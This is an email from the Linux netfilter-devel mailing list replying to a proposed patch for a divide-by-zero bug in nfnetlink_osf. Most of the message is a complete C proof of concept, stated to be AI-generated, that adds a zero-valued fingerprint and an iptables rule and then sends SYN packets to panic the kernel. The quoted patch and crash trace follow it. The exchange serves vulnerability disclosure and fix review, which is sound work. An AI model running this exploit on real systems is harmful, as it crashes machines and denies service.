Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A477A2FC893
	for <netfilter-devel@vger.kernel.org>; Tue, 14 Apr 2026 21:58:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.216.41
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776203905; cv=pass; b=ZT0EEZ6gmFxCG2jEYym4wW//iDmhxeTGRfbE24GYCe+8tKKBefROcMQPS0gpjjFj9Nqjcdb+1+rUE/kGsi9kr3KhB+BqhyWke04uYBmlS4eWrnHxbPOYvIwgRBd9W4WnymwluQm1KedWyMcfnJbBUvHo5BnwfVDIxROfmifvgFo=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776203905; c=relaxed/simple;
	bh=VYUp+CXbktytZnZIK65bQo4lp6X3GIu3631P1lRm2X8=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=ZE+XVNlOTzvystHRhJ9FZb2FVkrn0WI+YbGDqaWQBknbYFPjTFKS+GW93H+GOGK5SZV24Ac5TjkSE5cmFax9DeynJvArupZRscPwGC3FWAQXl2XyVFqomyw7vSXpFsrf4mkbyvuWTDbRxQQOgVa07IGqjzbAN1VcVsVEmo2hP7A=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=PWobDmow; arc=pass smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="PWobDmow"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-35fb0bb27e7so1914203a91.1
        for <netfilter-devel@vger.kernel.org>; Tue, 14 Apr 2026 14:58:23 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1776203903; cv=none;
        d=google.com; s=arc-20240605;
        b=V+VJiNzuMg129YjgqTZZMaeQ0gqyDqYcW67mV7iUTxVylFUhCaVMdx7KXASIcX8vys
         eel97yEBmnhuPqtvzLzskxLiRa1omU03idw0IEs/RdchEEfnlU4P9Lfn+feVY/sFlmyt
         xFR7SD8ZjCyVt9+nZ5tefozdDOciNpH48chw9gZmnw9lEl1sfwApYY+uWVcDuYRQllOl
         HMaIRDhBCE0Fbm5F0ZpToNZLSopV5F4bW6vsLgX4Ivq2N3epuJoX28Gw1JfJGy0RW1l3
         cAwXVQ8wdyCjGOqYiduyrIexlhRVXuiOk4JCiNqrUr7rmwDr3Lwe6fo/I1RQuB7GadsE
         F5GA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=jRKUQzZoCCj1XLGWWBAbiRcsTGFtWo/NfSmzA+Hkq18=;
        fh=iCjVDsbW9GMWkouiosnpqntZ8wkDB0SG4Dkaz0NZRz4=;
        b=OQScPrTae1H9qWJ/j9TW1nTkGsalyLAjnfCWAe8/lk5neOsSHFCN+TezmAToeiwKam
         rxY11jNimdI31XaDYUuvP7e7tub6wvxox/LHALghTdoM5FkSZgHGLaAeYRHQxj9Tdl3n
         3IVoetHwsfnumcUBeoQH84ROKEHIz0KDaEvfkekzxi6RMBN79Pvi2PT4zHbrejbeuvds
         hz/UOFNcBB8yHvMK7uarIWuQEv/SzgzE4HzSR2YJhoGxoz7otoia+cgXXzHvfuFKQsb/
         7lEYfC0tFZO2A/9gNNcSa17vvs9M3bu1PD0HEA0RIAfHG9COJLLzT/BXrm9simVWw7v4
         h0xw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1776203903; x=1776808703; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=jRKUQzZoCCj1XLGWWBAbiRcsTGFtWo/NfSmzA+Hkq18=;
        b=PWobDmowuQLf9NYTTvpTc70dER5pxHxSj/HyLKiw2/MoeNDz2tSBYAfTSvtMhYAoMC
         z/zk2OpVcE+jFImTMjf2V5At46A2q9p4Mi0KvLZwG5PUsMHhS/Ara0U7eKQgcOKrFnVx
         3hHds3W8cdE9exf3IWLCFqwU3zLcoTHqegugmGblA63WQM2rQ80Z6r7X8swlrxVKhRwf
         L3blWqqyazAWSrYCQu/F4bSr/5yXmHru+LzNhoQoqedBi22y7m+X5+73r2KBoT5O8eV4
         Zg0OUGMrPCrUvAQL+kdcabS3eh54s63A0LgVbdsZdhT+GQIjvirt8UTTaf/mgIHXUVa6
         AYSA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1776203903; x=1776808703;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=jRKUQzZoCCj1XLGWWBAbiRcsTGFtWo/NfSmzA+Hkq18=;
        b=adNmgGhMvMhucWnPcza1na8pyfppC3QQ4/71R/1r4GoCl8US1xgNjy/UHHgKhCcZdq
         qQET4q1RgyuanL9H0ydNZd5TADS6Y7btoeV7eSQxkldvI+YFOnqWfyY3Ycs/H0uT77rj
         sAyCGrlpBATexc15t7ZMmshqci9gjknG5Y/xoO9Arj4CKpSirqdil1/VdNEGBDivoJ3S
         oWVxUt1VwThkWTLW7DJRouz9Bl/EUeRGQjEFZq5EgAKXF5hHCHUxeHa8F1cjJI1UVZTh
         heK4nZA/P61n5dRXSy6KYSkqqQor6/wBHIJBC0KKryU+DWXHKDGnFNVIsI6+Bj9xSUQ6
         ARHg==
X-Gm-Message-State: AOJu0YxkIHPxnTgm6dpxBgOJWa949tTyMbTbWSiUwa7S/FzgFxDPppUF
	VudmJCAeZAgHwE5hLy1eaUdD7+Lamr8RTHuIoe/atVCPHmnOCGosS/lSlGjtQkQ7wDqYI+mgjAj
	Y/yGWQQV66F1ppek3jvEEXdxysmDSGv6HRm0ybODwzI2ZdUcdRRih/roE
X-Gm-Gg: AeBDievGjJUAnsJs2xOlzxvNI7Otdyh86orPzeqrLQ0Z5obKiwqutLtCpZcMlEMInwX
	2qzyp8tdhx4RfBlLfdOqkppMNaW7MCptRRy1iqisRi3Uvkw7aLTq/PZxiGjb5+2cI4stzCzF6Uu
	EB504ExlZqHG2RknMURy2IhGeqfO5o16gbt5xjPnMc2OvFfGXKuW/1PorZlJ9jtaFyPxYFuVSnh
	Iz7/ZH6cnIZa2WUyAVnFND36cHABdxeVrHZh/ahFMPGEVfDc4BeoB306tzJKZYe5mr2UO0r06Aj
	pmBvHUaXommNdqE9WgmraxVx/Kx88w==
X-Received: by 2002:a17:90b:4988:b0:359:f6f8:57b8 with SMTP id
 98e67ed59e1d1-35e4254146amr19122915a91.1.1776203902850; Tue, 14 Apr 2026
 14:58:22 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260414111722.6944-1-pablo@netfilter.org>
In-Reply-To: <20260414111722.6944-1-pablo@netfilter.org>
From: Xiang Mei <xmei5@asu.edu>
Date: Tue, 14 Apr 2026 14:58:11 -0700
X-Gm-Features: AQROBzD4tVnf9bukLQBQxdznHJxbswHWRCLu-0bXv_9HE2VdwImekhhqSUkXnos
Message-ID: <CAPpSM+TA7PvmDDm=iOU1mkvviKOW5_R9j1bZkSwJ3nhpqWJKrA@mail.gmail.com>
Subject: Re: [PATCH nf] netfilter: nfnetlink_osf: fix divide-by-zero in OSF_WSS_MODULO
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: netfilter-devel@vger.kernel.org, fw@strlen.de
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Pablo,

Sorry for the delay. I didn't get time to check the v1 discussion last
week. Thanks for the tip that we should patch the bug at the
configuration path.

For the v2 patch. I have found that if we have `f->opt_num=3D0`, we can
bypass this check, and I used Claude to generate a PoC and verified
it:

```c
/*
 * AI-GENERATED PoC =E2=80=94 This code was produced by an AI assistant.
 * It has NOT been reviewed or verified by a human.
 * Bug: Divide-by-zero in nf_osf_match_one when WSS mode is MODULO and
wss.val is zero
 * Type: Divide-by-zero / Kernel panic
 * File: net/netfilter/nfnetlink_osf.c
 *
 * Steps:
 * 1. Add malicious OSF fingerprint with wss.wc=3DOSF_WSS_MODULO(3),
wss.val=3D0 via nfnetlink
 *    (requires root/CAP_NET_ADMIN in init namespace via capable() check)
 * 2. Add iptables rule with "osf" match via raw setsockopt (no
iptables binary needed)
 * 3. Send TCP SYN matching the fingerprint
 * 4. Kernel computes ctx->window % 0 =E2=86=92 divide-by-zero Oops
 *
 * REQUIREMENTS:
 * - Root privilege (capable(CAP_NET_ADMIN)) to add OSF fingerprint
 * - CONFIG_IP_NF_FILTER=3Dy (iptables filter table must be compiled in)
 * - CONFIG_NETFILTER_XT_MATCH_OSF=3Dy (osf match compiled in)
 * - CONFIG_NETFILTER_NETLINK_OSF=3Dy (OSF fingerprint database compiled in=
)
 *
 * Compile: gcc -static -o exploit poc.c -w
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/x_tables.h>
#include <linux/types.h>

/* OSF constants */
#define MAXGENRELEN     32
#define MAX_IPOPTLEN    40
#define OSF_WSS_MODULO  3
#define OSF_ATTR_FINGER 1
#define OSF_MSG_ADD     0
#define NFNL_SUBSYS_OSF 5
#define NFNETLINK_V0    0

struct nf_osf_wc {
    __u32   wc;
    __u32   val;
};

struct nf_osf_opt {
    __u16           kind, length;
    struct nf_osf_wc    wc;
};

struct nf_osf_user_finger {
    struct nf_osf_wc    wss;
    __u8    ttl, df;
    __u16   ss, mss;
    __u16   opt_num;
    char    genre[MAXGENRELEN];
    char    version[MAXGENRELEN];
    char    subtype[MAXGENRELEN];
    struct nf_osf_opt   opt[MAX_IPOPTLEN];
};

/* osf match info (same layout as nf_osf_info from uapi header) */
struct osf_match_info {
    char    genre[MAXGENRELEN];
    __u32   len;
    __u32   flags;    /* NF_OSF_GENRE =3D 1 */
    __u32   loglevel;
    __u32   ttl;
};
#define NF_OSF_GENRE (1 << 0)

/* ---- OSF fingerprint addition via nfnetlink ---- */

static int add_osf_fingerprint(void)
{
    struct {
        struct nlmsghdr  nlh;
        struct nfgenmsg  nfg;
        struct nlattr    nla;
        struct nf_osf_user_finger finger;
    } msg;
    struct sockaddr_nl addr;
    int sock, ret;
    char buf[4096];

    memset(&msg, 0, sizeof(msg));

    /* Fingerprint: wss.wc=3DMODULO, wss.val=3D0 =E2=86=92 triggers divide-=
by-zero */
    msg.finger.wss.wc  =3D OSF_WSS_MODULO;
    msg.finger.wss.val =3D 0;               /* BUG: ctx->window % 0 =E2=86=
=92 SIGFPE */
    msg.finger.ss      =3D 40;             /* IP total length: 20 IP + 20 T=
CP */
    msg.finger.ttl     =3D 64;            /* TTL must match */
    msg.finger.df      =3D 0;             /* DF=3D0 =E2=86=92 goes into nf_=
osf_fingers[0] */
    msg.finger.opt_num =3D 0;             /* no TCP options */
    strncpy(msg.finger.genre,   "TestOS", MAXGENRELEN - 1);
    strncpy(msg.finger.version, "1.0",    MAXGENRELEN - 1);
    strncpy(msg.finger.subtype, "test",   MAXGENRELEN - 1);

    msg.nla.nla_type =3D OSF_ATTR_FINGER;
    msg.nla.nla_len  =3D sizeof(struct nlattr) + sizeof(struct
nf_osf_user_finger);
    msg.nfg.nfgen_family =3D AF_INET;
    msg.nfg.version      =3D NFNETLINK_V0;
    msg.nlh.nlmsg_type  =3D (NFNL_SUBSYS_OSF << 8) | OSF_MSG_ADD;
    msg.nlh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE;
    msg.nlh.nlmsg_len   =3D sizeof(msg);
    msg.nlh.nlmsg_seq   =3D 1;
    msg.nlh.nlmsg_pid   =3D getpid();

    sock =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) { perror("socket(NETLINK_NETFILTER)"); return -1; }

    memset(&addr, 0, sizeof(addr));
    addr.nl_family =3D AF_NETLINK;
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(sock); return -1;
    }

    struct sockaddr_nl kernel =3D {.nl_family =3D AF_NETLINK};
    ret =3D sendto(sock, &msg, sizeof(msg), 0, (struct sockaddr
*)&kernel, sizeof(kernel));
    if (ret < 0) { perror("sendto(fingerprint)"); close(sock); return -1; }

    /* Check for error response */
    ret =3D recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
    if (ret > 0) {
        struct nlmsghdr *resp =3D (struct nlmsghdr *)buf;
        if (resp->nlmsg_type =3D=3D NLMSG_ERROR) {
            struct nlmsgerr *err =3D (struct nlmsgerr *)(resp + 1);
            if (err->error !=3D 0) {
                fprintf(stderr, "[-] OSF fingerprint add error: %d (%s)\n",
                        -err->error, strerror(-err->error));
                close(sock);
                return -1;
            }
        }
    }

    printf("[+] OSF fingerprint added (wss.wc=3DMODULO, wss.val=3D0)\n");
    close(sock);
    return 0;
}

/* ---- iptables rule addition via raw setsockopt ---- */
/*
 * Layout of new entry:
 *   ipt_entry (112 bytes, aligned 112)
 *   xt_entry_match header (32) + osf_match_info data (48) =3D 80 bytes
(aligned 80)
 *   xt_standard_target (40 bytes, aligned 40)
 * Total: 112 + 80 + 40 =3D 232 bytes
 */

#define XT_ALIGN8(s) (((s) + 7) & ~7)

static int add_iptables_rule(void)
{
    int sock, ret;
    struct ipt_getinfo info;
    struct ipt_get_entries *old_entries;
    struct ipt_replace *repl;
    size_t match_size, target_size, new_entry_size, new_total_size, old_siz=
e;
    unsigned char *new_entries_buf;
    unsigned int input_offset;

    /* Sizes */
    match_size     =3D XT_ALIGN8(sizeof(struct xt_entry_match) +
sizeof(struct osf_match_info));
    target_size    =3D XT_ALIGN8(sizeof(struct xt_standard_target));
    new_entry_size =3D XT_ALIGN8(sizeof(struct ipt_entry)) + match_size
+ target_size;

    sock =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket(AF_INET, SOCK_RAW)"); return -1; }

    /* Get current filter table info */
    {
        socklen_t sz =3D sizeof(info);
        memset(&info, 0, sizeof(info));
        strncpy(info.name, "filter", sizeof(info.name) - 1);
        if (getsockopt(sock, IPPROTO_IP, IPT_SO_GET_INFO, &info, &sz) < 0) =
{
            perror("getsockopt(IPT_SO_GET_INFO)");
            close(sock); return -1;
        }
    }
    old_size =3D info.size;

    /* Get current filter table entries */
    {
        size_t total =3D sizeof(struct ipt_get_entries) + old_size;
        socklen_t sz;
        old_entries =3D calloc(1, total);
        if (!old_entries) { perror("calloc(old_entries)");
close(sock); return -1; }
        strncpy(old_entries->name, "filter", sizeof(old_entries->name) - 1)=
;
        old_entries->size =3D old_size;
        sz =3D (socklen_t)total;
        if (getsockopt(sock, IPPROTO_IP, IPT_SO_GET_ENTRIES,
old_entries, &sz) < 0) {
            perror("getsockopt(IPT_SO_GET_ENTRIES)");
            free(old_entries); close(sock); return -1;
        }
    }

    new_total_size =3D old_size + new_entry_size;
    input_offset   =3D info.hook_entry[NF_INET_LOCAL_IN];

    /* Build new entries: [before INPUT] + [our rule] + [original from
INPUT onward] */
    new_entries_buf =3D calloc(1, new_total_size);
    if (!new_entries_buf) { perror("calloc"); free(old_entries);
close(sock); return -1; }

    if (input_offset > 0)
        memcpy(new_entries_buf, old_entries->entrytable, input_offset);

    /* Build our iptables entry */
    struct ipt_entry *entry =3D (struct ipt_entry *)(new_entries_buf +
input_offset);
    entry->ip.proto      =3D IPPROTO_TCP;  /* match TCP */
    entry->ip.flags      =3D 0;
    entry->ip.invflags   =3D 0;
    entry->nfcache       =3D 0;
    entry->target_offset =3D XT_ALIGN8(sizeof(struct ipt_entry)) + match_si=
ze;
    entry->next_offset   =3D new_entry_size;

    /* Match: "osf" */
    struct xt_entry_match *mhdr =3D (struct xt_entry_match *)(entry->elems)=
;
    mhdr->u.user.match_size =3D (uint16_t)match_size;
    strncpy(mhdr->u.user.name, "osf", XT_EXTENSION_MAXNAMELEN - 1);
    mhdr->u.user.revision =3D 0;

    struct osf_match_info *mdata =3D (struct osf_match_info *)(mhdr->data);
    strncpy(mdata->genre, "TestOS", MAXGENRELEN - 1);
    mdata->len      =3D 0;
    mdata->flags    =3D NF_OSF_GENRE;
    mdata->loglevel =3D 2;
    mdata->ttl      =3D 0;

    /* Target: standard ACCEPT (empty name, verdict =3D -(NF_ACCEPT+1) =3D =
-1) */
    struct xt_standard_target *tgt =3D (struct xt_standard_target *)
        ((char *)entry + entry->target_offset);
    tgt->target.u.user.target_size =3D (uint16_t)target_size;
    tgt->target.u.user.name[0] =3D '\0';  /* XT_STANDARD_TARGET */
    tgt->verdict =3D -NF_ACCEPT - 1;

    /* Copy original entries from INPUT offset onward */
    memcpy(new_entries_buf + input_offset + new_entry_size,
           (char *)old_entries->entrytable + input_offset,
           old_size - input_offset);

    /* Build ipt_replace */
    size_t repl_total =3D sizeof(struct ipt_replace) + new_total_size;
    repl =3D calloc(1, repl_total);
    if (!repl) { perror("calloc(repl)"); free(new_entries_buf);
free(old_entries); close(sock); return -1; }

    strncpy(repl->name, "filter", sizeof(repl->name) - 1);
    repl->valid_hooks  =3D info.valid_hooks;
    repl->num_entries  =3D info.num_entries + 1;
    repl->size         =3D new_total_size;
    repl->num_counters =3D info.num_entries;
    repl->counters     =3D calloc(info.num_entries, sizeof(struct xt_counte=
rs));
    if (!repl->counters) {
        perror("calloc(counters)");
        free(repl); free(new_entries_buf); free(old_entries); close(sock);
        return -1;
    }

    /* Adjust hook/underflow offsets for all chains */
    for (int i =3D 0; i < NF_INET_NUMHOOKS; i++) {
        if (!(info.valid_hooks & (1 << i))) continue;
        repl->hook_entry[i] =3D info.hook_entry[i];
        repl->underflow[i]  =3D info.underflow[i];
        /* Shift entries that come after our insertion point */
        if (info.hook_entry[i] > input_offset)
            repl->hook_entry[i] +=3D new_entry_size;
        if (info.underflow[i] >=3D input_offset)
            repl->underflow[i] +=3D new_entry_size;
    }
    /* INPUT chain: new rule is inserted at input_offset */
    repl->hook_entry[NF_INET_LOCAL_IN] =3D input_offset;

    memcpy(repl->entries, new_entries_buf, new_total_size);

    ret =3D setsockopt(sock, IPPROTO_IP, IPT_SO_SET_REPLACE, repl, repl_tot=
al);
    if (ret < 0) {
        perror("setsockopt(IPT_SO_SET_REPLACE)");
        free(repl->counters); free(repl); free(new_entries_buf);
free(old_entries);
        close(sock);
        return -1;
    }

    printf("[+] iptables rule added: -m osf --genre TestOS -j ACCEPT\n");
    free(repl->counters); free(repl); free(new_entries_buf); free(old_entri=
es);
    close(sock);
    return 0;
}

/* ---- TCP SYN packet ---- */

static unsigned short ip_checksum(void *ptr, int nbytes) {
    unsigned short *p =3D ptr;
    unsigned long sum =3D 0;
    while (nbytes > 1) { sum +=3D *p++; nbytes -=3D 2; }
    if (nbytes =3D=3D 1) sum +=3D *(unsigned char *)p;
    sum =3D (sum >> 16) + (sum & 0xffff);
    sum +=3D (sum >> 16);
    return (unsigned short)(~sum);
}

/*
 * Send TCP SYN matching the fingerprint:
 *   IP total length =3D 40 (20 IP + 20 TCP, no options)
 *   TTL =3D 64, DF =3D 0 (no don't-fragment bit)
 *   TCP SYN, no TCP options (doff=3D5)
 *   Any window (any % 0 =3D divide by zero)
 */
static int send_matching_syn(void)
{
    int sock, one =3D 1;
    struct sockaddr_in dest;
    char packet[40];
    struct iphdr  *ip  =3D (struct iphdr  *)packet;
    struct tcphdr *tcp =3D (struct tcphdr *)(packet + 20);

    memset(packet, 0, sizeof(packet));

    ip->ihl      =3D 5;
    ip->version  =3D 4;
    ip->tos      =3D 0;
    ip->tot_len  =3D htons(40);    /* must match fingerprint ss=3D40 */
    ip->id       =3D htons(0x1234);
    ip->frag_off =3D 0;            /* DF=3D0 matches fingerprint df=3D0 */
    ip->ttl      =3D 64;           /* must match fingerprint ttl=3D64 */
    ip->protocol =3D IPPROTO_TCP;
    ip->saddr    =3D inet_addr("127.0.0.1");
    ip->daddr    =3D inet_addr("127.0.0.1");
    ip->check    =3D 0;
    ip->check    =3D ip_checksum(ip, 20);

    tcp->source  =3D htons(0xbeef);
    tcp->dest    =3D htons(9999);
    tcp->seq     =3D htonl(1);
    tcp->doff    =3D 5;            /* no options */
    tcp->syn     =3D 1;
    tcp->window  =3D htons(65535); /* any window % 0 =3D crash */
    tcp->check   =3D 0;

    /* TCP pseudo-header checksum */
    {
        struct { uint32_t s, d; uint8_t z, p; uint16_t l; } ph;
        char buf[sizeof(ph) + 20];
        ph.s =3D ip->saddr; ph.d =3D ip->daddr;
        ph.z =3D 0; ph.p =3D IPPROTO_TCP; ph.l =3D htons(20);
        memcpy(buf, &ph, sizeof(ph));
        memcpy(buf + sizeof(ph), tcp, 20);
        tcp->check =3D ip_checksum(buf, sizeof(buf));
    }

    sock =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket(SOCK_RAW)"); return -1; }
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL)"); close(sock); return -1;
    }

    memset(&dest, 0, sizeof(dest));
    dest.sin_family      =3D AF_INET;
    dest.sin_port        =3D htons(9999);
    dest.sin_addr.s_addr =3D inet_addr("127.0.0.1");

    if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr
*)&dest, sizeof(dest)) < 0) {
        perror("sendto(SYN)"); close(sock); return -1;
    }
    close(sock);
    return 0;
}

int main(void)
{
    printf("[*] OSF divide-by-zero PoC\n");
    printf("[*] Bug: net/netfilter/nfnetlink_osf.c nf_osf_match_one()\n");
    printf("[*]   case OSF_WSS_MODULO: ctx->window %% f->wss.val\n");
    printf("[*]   when wss.val=3D0, this causes a divide-by-zero kernel
panic\n\n");

    /* Step 1: Add malicious OSF fingerprint */
    printf("[*] Step 1: Adding malicious OSF fingerprint (wss.val=3D0)...\n=
");
    if (add_osf_fingerprint() < 0) {
        fprintf(stderr, "[-] Fatal: could not add OSF fingerprint
(need root)\n");
        return 1;
    }

    /* Step 2: Add iptables rule to activate OSF matching */
    printf("[*] Step 2: Adding iptables rule to enable OSF matching...\n");
    if (add_iptables_rule() < 0) {
        fprintf(stderr, "[-] Fatal: could not add iptables rule\n");
        return 1;
    }

    /* Step 3: Send matching TCP SYN packets */
    printf("[*] Step 3: Sending TCP SYN packets to trigger
divide-by-zero...\n");
    for (int i =3D 0; i < 5; i++) {
        printf("[*] SYN %d/5\n", i + 1);
        send_matching_syn();
        usleep(100000);
    }

    printf("[*] Done. Kernel should have crashed if vulnerable.\n");
    return 0;
}
```

I'll submit a v2 patch as a follow-up.

Thanks,
Xiang

On Tue, Apr 14, 2026 at 4:17=E2=80=AFAM Pablo Neira Ayuso <pablo@netfilter.=
org> wrote:
>
> Xiang Mei says:
>
> The OSF_WSS_MODULO branch in nf_osf_match_one() performs:
>
>   ctx->window % f->wss.val
>
> without guarding against f->wss.val =3D=3D 0.  A user with CAP_NET_ADMIN
> can add an OSF fingerprint with wss.wc =3D OSF_WSS_MODULO and wss.val =3D=
 0
> via nfnetlink.  When a matching TCP SYN packet arrives, the kernel
> executes a division by zero and panics.
>
> The OSF_WSS_PLAIN case already treats val =3D=3D 0 as a wildcard (match
> everything).  Apply the same semantics to OSF_WSS_MODULO: if val is 0,
> any window value matches rather than dividing by zero.
>
> Crash:
>  Oops: divide error: 0000 [#1] SMP KASAN NOPTI
>  RIP: 0010:nf_osf_match_one (net/netfilter/nfnetlink_osf.c:98)
>  Call Trace:
>  <IRQ>
>   nf_osf_match (net/netfilter/nfnetlink_osf.c:220 (discriminator 6))
>   xt_osf_match_packet (net/netfilter/xt_osf.c:32)
>   ipt_do_table (net/ipv4/netfilter/ip_tables.c:348)
>   nf_hook_slow (net/netfilter/core.c:622 (discriminator 1))
>   ip_local_deliver (net/ipv4/ip_input.c:265)
>   ip_rcv (include/linux/skbuff.h:1162)
>   __netif_receive_skb_one_core (net/core/dev.c:6181)
>   process_backlog (.include/linux/skbuff.h:2502 net/core/dev.c:6642)
>   __napi_poll (net/core/dev.c:7710)
>   net_rx_action (net/core/dev.c:7945)
>   handle_softirqs (kernel/softirq.c:622
>
> Fix this from control plane, reject f->wss.val =3D=3D 0 if wss.ws is
> OSF_WSS_MODULO.
>
> Fixes: 11eeef41d5f6 ("netfilter: passive OS fingerprint xtables match")
> Reported-by: Xiang Mei <xmei5@asu.edu>
> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
> ---
> Apologies, I don't mean to step on your feet with this patch.
> This just expedites scrutiny before PR submission.
>
>  net/netfilter/nfnetlink_osf.c | 9 +++++++++
>  1 file changed, 9 insertions(+)
>
> diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.=
c
> index 5d15651c74f0..bf47a3812910 100644
> --- a/net/netfilter/nfnetlink_osf.c
> +++ b/net/netfilter/nfnetlink_osf.c
> @@ -329,6 +329,15 @@ static int nfnl_osf_add_callback(struct sk_buff *skb=
,
>                 if (f->opt[i].kind =3D=3D OSFOPT_MSS && f->opt[i].length =
< 4)
>                         return -EINVAL;
>
> +               switch (f->wss.wc) {
> +               case OSF_WSS_MODULO:
> +                       if (f->wss.val =3D=3D 0)
> +                               return -EINVAL;
> +                       break;
> +               default:
> +                       break;
> +               }
> +
>                 tot_opt_len +=3D f->opt[i].length;
>                 if (tot_opt_len > MAX_IPOPTLEN)
>                         return -EINVAL;
> --
> 2.47.3
>
